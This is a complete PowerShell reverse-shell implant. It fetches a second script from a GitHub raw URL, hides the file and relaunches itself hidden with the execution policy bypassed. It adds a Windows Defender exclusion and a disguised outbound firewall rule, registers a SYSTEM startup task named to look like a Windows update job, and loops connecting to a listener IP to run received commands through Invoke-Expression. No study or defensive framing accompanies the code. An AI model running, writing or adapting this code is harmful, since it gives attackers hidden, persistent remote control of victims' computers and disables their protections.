# --- CONFIGURATION ---
$LHOST = "192.168.1.129" # Your listener IP
$LPORT = 4444          # Your listener Port
$WorkDir = "C:\Win"
$ScriptName = "service.ps1"
$FullPath = Join-Path $WorkDir $ScriptName
$TaskName = "WinUpdateMaintenance"
$RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
# ---------------------

# 1. INSTALLATION & REDIRECT
if ($PSCommandPath -ne $FullPath) {
    if (-not (Test-Path $WorkDir)) { New-Item $WorkDir -ItemType Directory -Force | Out-Null }
    
    # Only download if missing to prevent redundant traffic
    if (-not (Test-Path $FullPath)) {
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $FullPath)
            attrib +h +s $FullPath
        } catch { return }
    }

    # Start background process and terminate loader
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
    Stop-Process -Id $PID
}

# 2. SINGLE INSTANCE CHECK
if (-not $CreatedNew) { exit }

# 3. SYSTEM PREP (Admin Required)
try {
    Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
    if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
    }
} catch {}

# 4. ENHANCED PERSISTENCE (Runs every time Windows starts)
try {
    # We use -Force to overwrite any broken or existing tasks
    $Arg = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    
    # Settings ensure it runs immediately regardless of power state (AC/Battery)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force -ErrorAction SilentlyContinue
} catch {}

# 5. THE CORE ENGINE
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("--- Connection Established: $(hostname) [$(whoami)] ---")
        
        while ($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $imput = $reader.ReadLine()
            if ($null -eq $imput -or $imput -eq "exit") { break }
            if ([string]::IsNullOrWhiteSpace($imput)) { continue }

            if ($imput.ToLower().StartsWith("cd ")) {
                $newPath = $imput.Substring(3).Trim().Replace('"','')
                try { Set-Location $newPath } catch { $writer.WriteLine($_.Exception.Message) }
                continue
            }

            $output = try {
                Invoke-Expression $imput 2>&1 | Out-String
            } catch {
                $_.Exception.Message
            }
            
            $writer.Write($output)
        }
    } catch {
        Start-Sleep -Seconds 15
    } finally {
        if ($client) { $client.Close() }
    }
}
